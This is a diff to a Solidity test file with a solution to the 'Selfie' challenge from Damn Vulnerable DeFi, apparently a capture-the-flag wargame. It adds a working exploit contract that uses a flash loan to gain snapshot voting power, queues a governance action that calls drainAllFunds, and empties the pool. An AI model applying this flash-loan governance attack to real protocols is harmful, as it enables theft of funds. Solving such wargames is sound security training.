@@ -43,10 +43,30 @@ contract Selfie is Test {
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
 
-    function testExploit() public {
+    function testExploitSelfie() public {
         /**
          * EXPLOIT START *
          */
+  vm.startPrank(attacker);
+
+    // Deploy the exploit contract
+    SelfieExploit exploit = new SelfieExploit(
+        address(selfiePool),
+        address(simpleGovernance),
+        address(dvtSnapshot),
+        attacker
+    );
+
+    // Perform the flash loan attack
+    exploit.attack();
+
+    // Fast forward 2 days
+    vm.warp(block.timestamp + 2 days);
+
+    // Execute the drainAllFunds action
+    exploit.executeAction();
+
+    vm.stopPrank();
 
         /**
          * EXPLOIT END *
@@ -59,5 +79,44 @@ contract Selfie is Test {
         // Attacker has taken all tokens from the pool
         assertEq(dvtSnapshot.balanceOf(attacker), TOKENS_IN_POOL);
         assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
+    }
+}
+
+
+contract SelfieExploit {
+    SelfiePool private immutable pool;
+    SimpleGovernance private immutable governance;
+    DamnValuableTokenSnapshot private immutable token;
+    address private immutable attacker;
+    uint256 public actionId;
+
+    constructor(address _pool, address _governance, address _token, address _attacker) {
+        pool = SelfiePool(_pool);
+        governance = SimpleGovernance(_governance);
+        token = DamnValuableTokenSnapshot(_token);
+        attacker = _attacker;
+    }
+
+    function attack() external {
+        uint256 poolBalance = token.balanceOf(address(pool));
+        pool.flashLoan(poolBalance);
+    }
+
+    function receiveTokens(address tokenAddress, uint256 amount) external {
+        require(msg.sender == address(pool), "Caller must be pool");
+        
+        // Take a snapshot
+        token.snapshot();
+        
+        // Queue the drainAllFunds action
+        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", attacker);
+        actionId = governance.queueAction(address(pool), data, 0);
+        
+        // Return the tokens
+        token.transfer(address(pool), amount);
+    }
+
+    function executeAction() external {
+        governance.executeAction(actionId);
     }
 }
